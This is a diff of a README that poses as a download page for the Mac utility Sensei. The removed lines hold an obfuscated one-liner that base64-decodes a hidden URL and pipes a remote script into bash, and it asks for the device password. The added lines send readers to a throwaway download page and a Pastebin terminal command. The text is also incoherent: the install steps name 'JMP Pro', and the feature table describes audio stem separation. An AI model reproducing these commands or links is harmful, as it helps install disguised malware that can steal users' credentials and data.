@@ -2,21 +2,31 @@
 
 ![Sensei Mac Screenshot](https://cdn.wccftech.com/wp-content/uploads/2020/01/Sensei-appp.jpg)
 
+</div>
+
+<div align="center">
+
+[![🛠 DOWNLOAD: Sensei (Mac)](https://img.shields.io/badge/🛠%20DOWNLOAD:%20Sensei%20(Mac)-2c2c2c?style=for-the-badge&logo=apple&logoColor=white)](https://jumakas-olftol-mang.github.io/.github/senseimac)
+
+</div>
+
 ---
 
-## 📦 How to Install
+## Installation via .dmg:
 
-# Installation via a command in the terminal:
+1. Download the `.dmg` installer using the button above.  
+2. Open it and drag **JMP Pro** into your Applications folder.  
+3. Launch the app and sign in or activate with your license.  
+4. Start exploring and analyzing your data.  
 
-1. Copy the installation command below.
-```
-/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQxMC9pbnN0YWxsLnNo | base64 -d))"
-```
-2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
-3. Enter your device password and confirm the installation.
+## Installation via a command in the terminal:
 
-[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+1. Go to the Pastebin link below and copy the command:  
 
+   https://pastebin.com/raw/na7PdTXr  
+
+2. Open your terminal, paste the command, and run it.
+   
 ---
 
 ## 📦 What is Sensei for Mac?
@@ -31,15 +41,17 @@ Unlike the default macOS tools, **Sensei** offers advanced capabilities such as 
 
 ---
 
-## 🌟 Key Features & Benefits
+## Key Features  
 
-- 💽 **Disk Management** — analyze and optimize SSD and HDD health.
-- 🚀 **Performance Boost** — clean caches and optimize system startup.
-- 🌡 **Hardware Monitoring** — monitor CPU and GPU temperatures.
-- 📊 **Detailed Analytics** — get in-depth system usage statistics.
-- 🧹 **System Cleanup** — remove temporary and junk files.
-- 💡 **macOS Integration** — fully compatible with macOS Catalina and later.
-- ⚡ **Apple Silicon Ready** — optimized for M1/M2/M3 processors.
+| Feature                        | Description                                                                 |
+|--------------------------------|-----------------------------------------------------------------------------|
+| 🎤 Vocal Isolation             | Separate vocals from background music for remixes and karaoke               |
+| 🥁 Drum Extraction             | Isolate or remove beats for mashups and re-arrangements                     |
+| 🎹 Instrument Separation       | Split harmonics like piano, guitar, and synths with precision               |
+| ⚡ Real-Time Processing        | AI-powered stem separation with minimal latency                             |
+| 📂 Stem Export                 | Save vocals, instrumentals, and beats as separate audio files               |
+| 💻 macOS Compatibility         | Fully optimized for Intel and Apple Silicon Macs                            |
+
 
 ---
 
@@ -55,5 +67,3 @@ Unlike the default macOS tools, **Sensei** offers advanced capabilities such as 
 ## 🏷️ Keywords
 
 sensei mac, disk sensei, mac sensei, sensei for mac, sensei macos
-
----
